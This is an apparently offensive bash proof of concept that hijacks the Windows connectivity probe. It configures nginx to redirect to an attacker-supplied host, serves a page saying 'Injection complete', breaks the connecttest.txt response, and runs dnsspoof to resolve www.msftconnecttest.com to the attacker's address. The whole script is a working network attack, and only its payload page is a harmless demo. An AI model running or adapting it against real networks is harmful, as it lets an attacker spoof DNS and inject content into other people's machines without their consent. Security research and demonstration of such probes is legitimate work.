#!/usr/bin/bash

## Setup 302 prep
cat << "EOF" > /etc/nginx/sites-available/default
server {
	listen 80 default_server;
	root /var/www/html;
	index index.html index.htm index.nginx-debian.html;
	server_name _;
        rewrite ^/redirect$ http://CHANGE_ME/demo.html redirect;
	location / {
		try_files $uri $uri/ =404;
	}
}
EOF
sed -ie "s/CHANGE_ME/$2/" /etc/nginx/sites-available/default

## Create content to inject
cat << "EOF" > /var/www/html/demo.html
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
  <head>
    <meta http-equiv="content-type" content="application/xhtml+xml; charset=iso-8859-1" />
    <title>NCSI Probe Fun</title>
  </head>
  <body>
        <h2>Injection complete</h2>
  </body>
</html>
EOF

## Prevent the connecttest from working
cat << "EOF" > /var/www/html/connecttest.txt
A
EOF

## Load nginx
systemctl restart nginx

## dnsspoof
cat << EOF > ./hosts
$2 www.msftconnecttest.com
EOF
dnsspoof -i $1 -f ./hosts
